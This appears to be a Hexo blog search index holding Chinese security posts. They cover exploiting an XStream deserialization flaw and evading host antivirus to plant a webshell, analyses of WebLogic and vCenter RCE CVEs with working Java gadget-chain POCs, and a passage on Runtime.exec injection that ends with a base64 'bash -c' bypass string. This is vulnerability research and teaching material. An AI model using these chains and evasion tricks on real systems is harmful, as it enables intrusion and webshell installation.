<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[一次对反序列化漏洞的利用和主机防御绕过]]></title>
      <url>//blog/untitled-1629284496877.html</url>
      <content type="html"><![CDATA[<p>一次对反序列化漏洞的利用和主机防御绕过<br><a id="more"></a></p>
<p>无图…</p>
<p>在测试中发现一处 XStream 反序列化漏洞，使用 <code>ysoserial</code> 的 <code>CommonsBeanutils1</code> 的方式能成功远程代码执行，尝试使用系统命令写入 txt 文件成功：尝试写入 jsp 文件也成功，内容是 <code>test</code>。瞬间感觉稳了。</p>
<p>立马准备写入蚁剑马，但是由于马有点长，又有特殊符号，直接用 <code>cmd.exe /c echo xx &gt; 1.jsp</code> 的方式肯定不科学，所以用 <code>CertUtil</code> 马命令解码的方式写入文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo dGVzdA== &gt;web/a.txt &amp; CertUtil -decode web/a.txt web/b.jsp</span><br></pre></td></tr></table></figure></p>
<p>结果是 txt 文件存在， jsp 文件 404，这时觉得是马的问题，可能服务器上有啥防护，因为不能出网，所以也只能写文件了。之后用同样的 <code>CertUtil</code> 这种方式换了好几个免杀马都是404，这就很奇怪，难道现在的防护都怎么牛逼的吗？顿时觉得不太可能，也有可能是 <code>CertUtil</code> 这个命令的问题。</p>
<p>于是把内容换成正常的，在解码成后缀是 txt 的，结果还是没有解码后的文件，这里可以确认是命令被拦截了。</p>
<p>既然不能用 <code>CertUtil</code> 所以想着直接用代码写文件算了，因为是任意代码执行，所以用代码写文件应该是没问题的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String encodedText = &quot;PCUKb3V0LnByaW50KCJ0ZXN0Iik7CiU+&quot;;</span><br><span class="line">java.util.Base64.Decoder decoder = java.util.Base64.getDecoder();</span><br><span class="line">String  code_1 = new String(decoder.decode(encodedText), &quot;UTF-8&quot;);</span><br><span class="line">java.io.PrintWriter pu=new java.io.PrintWriter(new java.io.FileOutputStream(&quot;../1.jsp&quot;));</span><br><span class="line">pu.write(code_1);</span><br><span class="line">pu.close();</span><br></pre></td></tr></table></figure></p>
<p>不过本地测试成功，线上一直没成功，也不清楚是啥原因，这条思路又断了。</p>
<p>只能回到之前的 <code>cmd.exe /c echo xx &gt; 1.jsp</code> 这种成功的方式了，打算直接写入马，因为是直接使用 <code>ysoserial</code> 的 <code>CommonsBeanutils1</code>，所以在命令中加入双引号是个问题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot; + command.replaceAll(&quot;\\\\&quot;, &quot;\\\\\\\\&quot;).replaceAll(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;) + &quot;\&quot;);&quot;;</span><br></pre></td></tr></table></figure></p>
<p>省的麻烦，直接改造一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot; + command + &quot;\&quot;);&quot;;</span><br></pre></td></tr></table></figure></p>
<p>直接用 <code>cmd.exe /c  echo \&quot;123\&quot; ../1.jsp</code> 即可写入；</p>
<p>接下来写马，因为之前内容为 <code>test</code> 的 jsp 文件写入成功了，但是马写入失败，所以先写入一个测试的 jsp，内容为 <code>&lt;% out.print(&quot;test&quot;); %&gt;</code> ，失败。</p>
<p>写入测试的 txt，内容为 <code>&lt;% out.print(&quot;test&quot;); %&gt;</code>，成功；<br>把写入的 txt 文件用 <code>move</code> 命令改成 jsp 后缀，失败；<br>写入测试的 jsp，内容为 <code>&lt;%  %&gt;</code>，失败；<br>写入测试的 jsp，内容为 <code>&lt;123</code>，成功；</p>
<p>所以最后得出的结论是拦截内容中有 <code>&lt;%</code> 的后缀为 jsp 文件。这个可以用 <code>&lt;jsp:scriptlet&gt;</code> 替代。</p>
<p>最终使用 <code>&lt;jsp:scriptlet&gt;</code> 加上部分 <code>unicode</code> 编码绕过，成功传马，看了下进程，发现防御软件是数字全家桶：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">映像名称                       PID 会话名              会话#       内存使用 </span><br><span class="line">========================= ======== ================ =========== ============</span><br><span class="line">System Idle Process              0 Services                   0         24 K</span><br><span class="line">System                           4 Services                   0        372 K</span><br><span class="line">ZhuDongFangYu.exe              528 Services                   0     43,836 K</span><br><span class="line">360rp.exe                     5552                            1  1,115,180 K</span><br><span class="line">QQProtect.exe                 5024 Services                   0     22,220 K</span><br><span class="line">QQExternal.exe                8944                            1     20,244 K</span><br><span class="line">wdswfsafe.exe                 7056                            1     19,132 K</span><br><span class="line">360bdoctor.exe               23072                            1     16,264 K</span><br><span class="line">360tray.exe                  26164                            1    416,292 K</span><br><span class="line">360se.exe                    36916                            1     38,628 K</span><br><span class="line">360PatchMgr.exe              16528 Services                   0      9,728 K</span><br></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> 漏洞利用 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 姿势 </tag>
            
            <tag> WAF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Weblogic反序列化漏洞分析（CVE-2021-2394）]]></title>
      <url>//blog/1627537078445.html</url>
      <content type="html"><![CDATA[<p>Weblogic反序列化漏洞分析<br><a id="more"></a><br>重点在 <code>oracle.eclipselink.coherence.integrated.internal.querying.FilterExtractor</code> 这个类，其中有 <code>readExternal</code> 方法，可以对 <code>attributeAccessor</code> 就进行赋值：<br><img src="http://x-f1v3.github.io/images/1627537112077.png" alt="image"></p>
<p>这个 <code>AttributeAccessor</code> 类我们很熟悉了，就是之前的 <code>CVE-2020-14841</code> 就已经用到了。接着，跟进到 <code>SerializationHelper.readAttributeAccessor</code>,重新组建 <code>AttributeAccessor</code> 类：<br><img src="http://x-f1v3.github.io/images/1627537120556.png" alt="image"></p>
<p>这里有个坑，就是没有调用到 <code>setIsWriteOnly</code> 方法，所以之后的执行到 <code>MethodAttributeAccessor.initializeAttributes</code> 会有点小问题，这之后会提到。</p>
<p>在看到 <code>FilterExtractor</code> 的 <code>extract</code> 方法：<br><img src="http://x-f1v3.github.io/images/1627537131442.png" alt="image"></p>
<p>先执行 <code>attributeAccessor.initializeAttributes(obj.getClass())</code>:<br><img src="http://x-f1v3.github.io/images/1627537142365.png" alt="image"></p>
<p>这里就是上面的坑点，由于 <code>MethodAttributeAccessor</code> 是通过反序列化重构的，不像 <code>CVE-2020-14841</code> 通过反射直接插入，所以无法修改 <code>IsWriteOnly</code> 的值。所以这里就必须进入 <code>if</code>,且 <code>GetMethod</code> 和 <code>SetMethod</code> 必须有关联.这里的关联是获取 <code>GetMethod</code> 方法的返回类型，然后传入 <code>SetMethod</code> 方法参数中，所以这里直接套用 <code>CVE-2020-14841</code> 的利用方式是不行的：<br><img src="http://x-f1v3.github.io/images/1627537157211.png" alt="image"></p>
<p>最后执行到 <code>this.attributeAccessor.getAttributeValueFromObject(obj)</code>,就是单纯的无参方法反射执行了：<br><img src="http://x-f1v3.github.io/images/1627537167207.png" alt="image"></p>
<p>其实可以看出，后半段的执行方法和 <code>CVE-2020-14841</code> 几乎一样，除了坑点那里稍做修改，可以利用 <code>setConnection</code> 和 <code>connect</code> 方法绕一下。</p>
<p>再来看前半段，有调用到 <code>extract</code> 方法，可以直接用到 <code>CVE-2020-14756</code> 的前半段的方式，这个之前分析过，就不再多说了。</p>
<p>还有最后一点，因为最新的补丁在 T3 反序列化上是用了白名单，所以走 T3 协议不会成功：<br><img src="http://x-f1v3.github.io/images/1627537176860.png" alt="image"></p>
<p>只能走 IIOP：<br><img src="http://x-f1v3.github.io/images/1627537184802.png" alt="image"></p>
<p>总结一下，这个漏洞其实是多个先前漏洞的组合利用，找到了替代之前黑名单的类，关键还是在 <code>MethodAttributeAccessor</code> 的调用，可以找找其他类中有调用 <code>MethodAttributeAccessor</code> 的地方。</p>
]]></content>
      
        <categories>
            
            <category> 漏洞分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Weblogic </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Weblogic反序列化漏洞分析（CVE-2021-2135）]]></title>
      <url>//blog/1626153074926.html</url>
      <content type="html"><![CDATA[<p>Weblogic反序列化漏洞分析（CVE-2021-2135）</p>
<a id="more"></a>
<p>先看 <code>com.tangosol.util.ExternalizableHelper</code> 方法，其中有 <code>toBinary</code> 和 <code>fromBinary</code> 可以把任意类转化和重建，这里可以作为 <code>sink</code>:<br><img src="http://x-f1v3.github.io/images/1626153595927.png" alt="image"></p>
<p>接下来就就是寻找利用链，寻找使用了这个 <code>fromBinary</code> 方法的地方，这里找到了 <code>com.tangosol.internal.util.SimpleBinaryEntry</code>:<br><img src="http://x-f1v3.github.io/images/1626153605553.png" alt="image"></p>
<p>这里的 <code>getKey</code> 和 <code>getValue</code> 方法都用到了 <code>fromBinary</code>，此外，还有个 <code>toString</code> 方法也调用了 <code>getKey</code> 和 <code>getValue</code>，间接的使用了 <code>fromBinary</code>：<br><img src="http://x-f1v3.github.io/images/1626153613625.png" alt="image"></p>
<p>这里的 <code>toString</code> 方法非常熟悉了，本来可以直接使用 <code>BadAttributeValueExpException.readObject()</code> 利用链，但是观察到 <code>m_key</code> 和 <code>m_value</code> 变量是用 <code>transient</code> 修饰的，所以无法通过 <code>readObject</code> 的方式来赋值。</p>
<p>所以需要半自动化的寻找，最后作者找到了 <code>ConditionalPutAll</code> 的利用链，<br><img src="http://x-f1v3.github.io/images/1626153622823.png" alt="image"></p>
<p>接着看 <code>ConditionalPutAll</code> 有 <code>readExternal</code> 方法调用了 <code>ExternalizableHelper.readMap</code>：<br><img src="http://x-f1v3.github.io/images/1626153631138.png" alt="image"></p>
<p>跟进发现调用了 <code>map.put</code>:<br><img src="http://x-f1v3.github.io/images/1626153640707.png" alt="image"></p>
<p>这里的 <code>map</code> 可以是上面的 <code>LiteMap</code>，在 <code>this.m_nImpl</code> 是 2 时，会调用 <code>Base.equals</code>:<br><img src="http://x-f1v3.github.io/images/1626153648429.png" alt="image"></p>
<p>继续跟进 <code>Base.equals</code>:<br><img src="http://x-f1v3.github.io/images/1626153655895.png" alt="image"></p>
<p>由于这里的传入参数都是可控的，所以这里可以控制到 <code>XString.equals</code>：<br><img src="http://x-f1v3.github.io/images/1626153664088.png" alt="image"></p>
<p>最终执行到 <code>toString</code> 方法，整个链就走通了。</p>
<p>POC<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">    MvelExtractor extractor = new MvelExtractor(&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);</span><br><span class="line"></span><br><span class="line">    TopNAggregator.PartialResult partialResult = new TopNAggregator.PartialResult((Comparator)extractor, 1);</span><br><span class="line">    NavigableMap&lt;Object, Object&gt; map = new TreeMap&lt;&gt;();</span><br><span class="line">    Field field = SortedBag.class.getDeclaredField(&quot;m_map&quot;);</span><br><span class="line">    field.setAccessible(true);</span><br><span class="line">    map.put(&quot;1&quot;, &quot;1&quot;);</span><br><span class="line">    field.set(partialResult, map);</span><br><span class="line"></span><br><span class="line">    Binary binarykey = ExternalizableHelper.toBinary(partialResult);</span><br><span class="line">    Binary binaryvalue = new Binary();</span><br><span class="line">    SimpleBinaryEntry simpleBinaryEntry = new SimpleBinaryEntry(binarykey, binaryvalue);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    XString xString = new XString(&quot;1&quot;);</span><br><span class="line">    LiteMap liteMap = new LiteMap();</span><br><span class="line"></span><br><span class="line">    setFieldValue(liteMap,&quot;m_nImpl&quot;,intToByteArray(3)[3]);</span><br><span class="line"></span><br><span class="line">    Field m_oContents = LiteMap.class.getDeclaredField(&quot;m_oContents&quot;);</span><br><span class="line">    m_oContents.setAccessible(true);</span><br><span class="line"></span><br><span class="line">    Map.Entry[] aEntry = new Map.Entry[8];</span><br><span class="line"></span><br><span class="line">    Map.Entry&lt;SimpleBinaryEntry, String&gt; x1 = new AbstractMap.SimpleEntry&lt;&gt;(simpleBinaryEntry, &quot;aaa&quot;);</span><br><span class="line">    Map.Entry&lt;XString, String&gt; x2 = new AbstractMap.SimpleEntry&lt;&gt;(xString, &quot;bbb&quot;);</span><br><span class="line">    aEntry[0] = x1;</span><br><span class="line">    aEntry[1] = x2;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    m_oContents.set(liteMap, aEntry);</span><br><span class="line">    ConditionalPutAll conditionalPutAll = new ConditionalPutAll();</span><br><span class="line">    setFieldValue(conditionalPutAll, &quot;m_map&quot;, liteMap);</span><br><span class="line">    AttributeHolder attributeHolder2 = new AttributeHolder();</span><br><span class="line">    field = attributeHolder2.getClass().getDeclaredField(&quot;m_oValue&quot;);</span><br><span class="line">    field.setAccessible(true);</span><br><span class="line">    field.set(attributeHolder2, conditionalPutAll);</span><br><span class="line">    File f = new File(&quot;tmp1.ser&quot;);</span><br><span class="line">    ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(f));</span><br><span class="line">    obj.writeObject(attributeHolder2);</span><br><span class="line">    obj.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;</span><br><span class="line">    Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">    field.set(obj, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static Field getField(Class&lt;?&gt; clazz, String fieldName) &#123;</span><br><span class="line">    Field field = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        field = clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">    &#125; catch (NoSuchFieldException var4) &#123;</span><br><span class="line">        if (clazz.getSuperclass() != null)</span><br><span class="line">            field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">    &#125;</span><br><span class="line">    return field;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static byte[] intToByteArray(int i) &#123;</span><br><span class="line">    byte[] result = new byte[4];</span><br><span class="line">    result[0] = (byte)((i &gt;&gt; 24) &amp; 0xFF);</span><br><span class="line">    result[1] = (byte)((i &gt;&gt; 16) &amp; 0xFF);</span><br><span class="line">    result[2] = (byte)((i &gt;&gt; 8) &amp; 0xFF);</span><br><span class="line">    result[3] = (byte)(i &amp; 0xFF);</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="http://x-f1v3.github.io/images/1626153675838.png" alt="image"></p>
]]></content>
      
        <categories>
            
            <category> 漏洞分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Weblogic </tag>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Weblogic反序列化漏洞分析（CVE-2020-14756）]]></title>
      <url>//blog/1625734346327.html</url>
      <content type="html"><![CDATA[<p>已有相关文章，就抄下作业。<br><a id="more"></a></p>
<p>先从 <code>com.tangosol.util.ExternalizableHelper</code> 开始，其 <code>readObject</code> 方法的入参是 <code>DataInput</code> 类的，最终会执行到 <code>readObjectInternal</code> 方法<br><img src="http://x-f1v3.github.io/images/1625734395645.png" alt="image"></p>
<p>当 <code>nType</code> 的值是 10 时，会执行 <code>readExternalizableLite</code> 方法：<br><img src="http://x-f1v3.github.io/images/1625734405058.png" alt="image"></p>
<p>而这个 <code>nType</code> 是根据反序列化对象的类来判断的：<br><img src="http://x-f1v3.github.io/images/1625734414907.png" alt="image"></p>
<p>进入 <code>readExternalizableLite</code> 方法，该方法中可以 <code>loadclass</code>,这个 <code>class</code> 是 <code>ExternalizableLite</code> 类，因为是二次反射，所以不经过黑名单的限制：<br><img src="http://x-f1v3.github.io/images/1625734424170.png" alt="image"></p>
<p>之后，调用到这个 <code>class</code> 的 <code>readExternal</code> 方法：<br><img src="http://x-f1v3.github.io/images/1625734431775.png" alt="image"></p>
<p>由于 <code>Extractor</code> 基本上都实现了 <code>ExternalizableLite</code> 这个接口，所以可以用 <code>MvelExtractor</code> 这个利用链，通过以 <code>readExternal(DataInput in)</code> 为 <code>source</code>，以 <code>com.tangosol.util.extractor.AbstractExtractor#compare</code> 为sink，作者找到了 <code>TopNAggregator.PartialResult</code>，该类也继承 <code>ExternalizableLite</code>:<br><img src="http://x-f1v3.github.io/images/1625734439819.png" alt="image"></p>
<p>且在 <code>readExternal</code> 中调用了自身的 <code>add</code> 方法，同时也注意到 <code>this.m_comparator</code> 也是通过 <code>ExternalizableHelper.readObject</code> 获得的，所以用之前的漏洞利用链 <code>MvelExtractor</code> 是可以的，在看 <code>add</code> 方法：<br><img src="http://x-f1v3.github.io/images/1625734448382.png" alt="image"></p>
<p>调用了 <code>this.m_comparator.compare</code> ，刚好接上利用链，同时为了不满足 <code>this.size() &lt; this.m_cMaxSize</code> 所以必须给 <code>this.size()</code> 一个值，跟进：<br><img src="http://x-f1v3.github.io/images/1625734460488.png" alt="image"></p>
<p>发现是在父类中，<code>NavigableMap</code> 的 <code>size</code> ，反射插入即可。</p>
<p><code>sink</code> 解决了，在看 <code>source</code> ,因为 <code>com.tangosol.util.ExternalizableHelper</code> 的 <code>readObject</code> 方法的入参是 <code>DataInput</code> 类的，所以无法直接反序列化执行，现在需要找个类的 <code>readExternal(ObjectInput in)</code> 或者 <code>readObject(ObjectInputStream in)</code> 中有 <code>ExternalizableHelper.readObject</code> 且其对应的是 <code>Object</code> 而不是特定的类，这里找到了 <code>com.tangosol.coherence.servlet.AttributeHolder</code>:<br><img src="http://x-f1v3.github.io/images/1625734475622.png" alt="image"></p>
<p>这里还有个问题，就是 <code>m_oValue</code> 虽然是 <code>Object</code> 但是有 <code>transient</code> 修饰，按理来说不应该参加反序列化，但这里用的是 <code>readExternal</code>，而 <code>transient</code> 关键字只能与 <code>Serializable</code> 接口搭配使用<br><img src="http://x-f1v3.github.io/images/1625734485223.png" alt="image"></p>
<p>以上刚好构造好了整合利用链，相关代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">MvelExtractor extractor = <span class="keyword">new</span> MvelExtractor(<span class="string">"Runtime.getRuntime().exec(\"calc\");"</span>);</span><br><span class="line"></span><br><span class="line">       TopNAggregator.PartialResult partialResult = <span class="keyword">new</span> TopNAggregator.PartialResult((Comparator)extractor, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">       NavigableMap&lt;Object, Object&gt; map = <span class="keyword">new</span> TreeMap&lt;&gt;();</span><br><span class="line">       AttributeHolder attributeHolder = <span class="keyword">new</span> AttributeHolder();</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           Field field1 = SortedBag.class.getDeclaredField(<span class="string">"m_map"</span>);</span><br><span class="line">           field1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">           map.put(<span class="string">"1"</span>, <span class="string">"1"</span>);</span><br><span class="line">           field1.set(partialResult, map);</span><br><span class="line"></span><br><span class="line">           Field field = AttributeHolder.class.getDeclaredField(<span class="string">"m_oValue"</span>);</span><br><span class="line">           field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">           field.set(attributeHolder, partialResult);</span><br><span class="line">           File f = <span class="keyword">new</span> File(<span class="string">"tmp.ser"</span>);</span><br><span class="line">           ObjectOutputStream obj = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">           obj.writeObject(attributeHolder);</span><br><span class="line">           obj.close();</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="http://x-f1v3.github.io/images/1625734508041.png" alt="image"></p>
<p>在这个漏洞中，最重要的感觉还是 <code>loadclass</code> 这个点，其他基于这个点的 <code>source</code> 和 <code>sink</code> 都可以通过半自动化得到。</p>
]]></content>
      
        <categories>
            
            <category> 漏洞分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Weblogic </tag>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[VCenter Server RCE (CVE-2021-21985)]]></title>
      <url>//blog/1622788709768.html</url>
      <content type="html"><![CDATA[<p>漏洞触发的原理比较直接，在 <code>com.vmware.vsan.client.services.ProxygenController</code> 中可以反射任意 <code>bean</code> 的任意方法：<br><a id="more"></a><br><img src="http://x-f1v3.github.io/images/1622788737176.png" alt="image"></p>
<p>主要是利用的问题，有公开了一个<a href="https://www.iswin.org/2021/06/02/Vcenter-Server-CVE-2021-21985-RCE-PAYLOAD/" target="_blank" rel="noopener">利用方法</a>，学习一下，文章中的类和方法是 <code>&amp;vsanProviderUtils_setVmodlHelper/</code> 和 <code>setTargetObject</code>，经过一通寻找，最终发现是和 <code>org.springframework.beans.factory.config.MethodInvokingBean</code> 等有关：<br><img src="http://x-f1v3.github.io/images/1622788764161.png" alt="image"></p>
<p>进该类看下，发现最终是继承 <code>org.springframework.util.MethodInvoker</code> 的，在其中有 <code>setTargetObject</code>、<code>setTargetMethod</code>、<code>setTargetClass</code>、<code>setArguments</code>、<code>prepare</code> 方法，设置反射所必需的条件，最后还有个 <code>invoke</code> 方法，可以调用任意类的任意静态方法 ：<br><img src="http://x-f1v3.github.io/images/1622788785935.png" alt="image"></p>
<p>非常完美，唯一有些遗憾的是必须是静态方法。在文章中使用的是 <code>javax.naming.InitialContext.doLookup</code> 进行 <code>JNDI</code> 利用，达到 RCE：<br><img src="http://x-f1v3.github.io/images/1622788794333.png" alt="image"></p>
<p>学习了这个利用链，可以作为 <code>Spring bean RCE</code> 的利用链之一。</p>
<p> 之后又公开了另一种<a href="http://noahblog.360.cn/vcenter-cve-2021-2021-21985/" target="_blank" rel="noopener">利用方式</a>，在 <code>com.vmware.vim.vmomi.core.types.impl.VmodContextImpl</code> 类中的 <code>loadVmodlPackage</code> 方法：<br><img src="http://x-f1v3.github.io/images/1623048920545.png" alt="image"></p>
<p>其中 <code>NonValidatingClassPathXmlApplicationContext</code> 是继承 <code>ClassPathXmlApplicationContext</code> 并调用了其构造方法，导致的远程加载 <code>xml</code> 文件找造成 <code>Spel RCE</code>:<br><img src="http://x-f1v3.github.io/images/1623048967538.png" alt="image"></p>
<p>（之前走马观花看到过这个类，给忽略了。。。居然没发现）</p>
<p>当然，文章中的回显思路也是很赞的，利用一个回显的 SSRF，返回 <code>xml</code> 内容，并利用 <code>ClassPathXmlApplicationContext</code> 解析，最后将结果放到 <code>System Properties</code> 存储，第二个请求，则将 <code>System Properties</code> 的内容输出，以达到回显的目的，盗一张图：<br><img src="http://x-f1v3.github.io/images/1623048993497.png" alt="image"></p>
<p>还有一种<a href="https://testbnull.medium.com/a-quick-look-at-cve-2021-21985-vcenter-pre-auth-rce-9ecd459150a5" target="_blank" rel="noopener">方法</a>，这种方法和第一种方法的点是一样的，但是利用点不同，这是利用 <code>org.eclipse.jdt.internal.compiler.parser.Parser</code>类的 <code>buildFileForTable</code> 方法直接写  <code>class</code>：<br><img src="http://x-f1v3.github.io/images/1623049003199.png" alt="image"></p>
<p>然后使用 <code>java.lang.System</code> 的 <code>load</code> 方法调用该类（貌似这个类还不是普通的类）：<br><img src="http://x-f1v3.github.io/images/1623049014091.png" alt="image"></p>
<p>文中还有一种方法，使用 <code>jdk.jfr.internal.Utils</code> 类中的 <code>writeGeneratedASM</code> 方法写 <code>class</code>:<br><img src="http://x-f1v3.github.io/images/1623049022866.png" alt="image"></p>
<p>之前还需利用 <code>java.lang.System.setProperty()</code> 修改 <code>SAVE_GENERATED</code> 的值</p>
<p>最后是作者的 <a href="https://github.com/testanull/Project_CVE-2021-21985_PoC" target="_blank" rel="noopener">Github</a></p>
<p>学习了很多，点也不难，但是要找利用链，确实太耗时间了…</p>
]]></content>
      
        <categories>
            
            <category> 漏洞利用 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
            <tag> POC </tag>
            
            <tag> 姿势 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[探探 Java Runtime.getRuntime()]]></title>
      <url>//blog/1621503785097.html</url>
      <content type="html"><![CDATA[<p>在审计中，发现了如下代码<br><a id="more"></a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String cmd = <span class="string">"ping -c 3 "</span> + ip;</span><br><span class="line">Process myProcess = Runtime.getRuntime().exec(cmd);</span><br></pre></td></tr></table></figure>
<p>以为是妥妥的代码执行漏洞，结果各种尝试都不成功，白激动了，分析下未成功的原因。之前也看过了各位大佬的文章，但是等到自己遇到了，还是会掉到坑里，所以还是要亲自动手。</p>
<h2 id="源码调试"><a href="#源码调试" class="headerlink" title="源码调试"></a>源码调试</h2><p>跟进调试，发现传入的字符串通过 <code>StringTokenizer</code> 分割成数组<br><img src="http://x-f1v3.github.io/images/1621503843351.png" alt="image"></p>
<p>其中 <code>StringTokenizer</code> 的分割依据是 <code>\t\n\r\f</code><br><img src="http://x-f1v3.github.io/images/1621503849693.png" alt="image"></p>
<p>之后调用到 <code>ProcessBuilder.start</code>,取出数组中除了第一个之外的元素都当作参数,并且把参数之间的空格之类的全部替换成 <code>\u0000</code><br><img src="http://x-f1v3.github.io/images/1621503857241.png" alt="image"></p>
<p>最后是以命令数组的第一个元素作为命令，其他之后的元素统统作为参数来来执行命令<br><img src="http://x-f1v3.github.io/images/1621503864916.png" alt="image"></p>
<p>当然最终多个命令没有执行成功<br>在用数组作为参数尝试，发现也是一样，并没有成功<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String[] command = &#123; &quot;ping&quot;,&quot;-c 1 8.8.8.8&amp;&amp;ls&quot; &#125;;</span><br><span class="line">Process myProcess = Runtime.getRuntime().exec(cmd);</span><br></pre></td></tr></table></figure></p>
<p>因为最终追到 <code>native</code> 方法，没有具体的处理方法，我之前的猜测是程序把第一个命令数组的元素作为命令，其他都作为纯字符串，类似于下面这样的：<br><img src="http://x-f1v3.github.io/images/1621503874618.png" alt="image"></p>
<p>不过看到大佬的调试 <code>JVM</code>，最终原因是底层方法 <code>execvp</code> 直接处理特殊符号时，会报错。<br><img src="http://x-f1v3.github.io/images/1621503883305.png" alt="image"></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>现在的解决方法有2种，第一种是<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String command= <span class="string">"bash -c &#123;echo,ZWNobyAxMjMgJiYgZWNobyAxMjQ=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span>;</span><br></pre></td></tr></table></figure></p>
